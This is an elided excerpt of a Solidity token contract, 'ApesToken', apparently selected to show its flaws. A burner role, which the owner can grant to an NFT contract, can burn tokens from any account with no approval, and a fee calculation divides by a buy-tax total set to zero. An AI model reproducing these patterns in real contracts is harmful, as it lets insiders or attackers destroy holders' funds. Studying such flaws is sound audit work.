...
contract ApesToken is Context, IERC20, Ownable {
    ...
    string private _symbol = "AEPS";
    uint8 private _decimals = 9;
    mapping(address => bool) private _burners;

    address payable public marketingWalletAddress =
        payable(0x0Ba196bd0878e458F4b9dA67192F198Ea5Aab902);
    address payable public buyBackWalletAddress =
        payable(0xcb2E13C2818511EcB2E3cd59b81cF82d5A43DA84);
    ...
    uint256 public _extraFeeOnSell = 1;
    uint256 public _totalTaxIfBuying = 0;
    uint256 public _totalTaxIfSelling = 0;

    uint256 private _totalSupply = 1000 * 10**9 * 10**_decimals;
    ...
    modifier onlyBurner() {
        require(_burners[_msgSender()], "Only burner allowed");
        _;
    }
    ...
    function addBurner(address burner) public onlyOwner {
        require(burner != address(0), "Ownable: burner is the zero address");
    ...
    function setTaxFreeAddress(address newAddress) external onlyOwner {
        isExcludedFromFee[address(newAddress)] = true;
        isWalletLimitExempt[address(newAddress)] = true;
    }

    function removeTaxFreeAddress(address newAddress) external onlyOwner {
        isExcludedFromFee[address(newAddress)] = false;
        isWalletLimitExempt[address(newAddress)] = false;
    }

    function setMineAndNFT(address mine, address nft) external onlyOwner {
        isExcludedFromFee[address(mine)] = false;
        isWalletLimitExempt[address(mine)] = false;
        _burners[address(nft)] = true;
    }
    ...
    function burn(address account, uint256 amount) public onlyBurner {
        _basicTransfer(account, deadAddress, amount);
    }
    ...
    function swapAndLiquify(uint256 tAmount) private lockTheSwap {
        ...
        uint256 totalBNBFee = _totalTaxIfBuying.sub(_liquidityFee.div(2));

        uint256 amountBNBLiquidity = amountReceived
            .mul(_liquidityFee)
            .div(totalBNBFee)
            .div(2);
        uint256 amountBNBBuyBack = amountReceived.mul(_buyBackFee).div(
            totalBNBFee
        );
    ...
    function takeFee(
        ...
        uint256 feeAmount = recipient == uniswapV2Pair
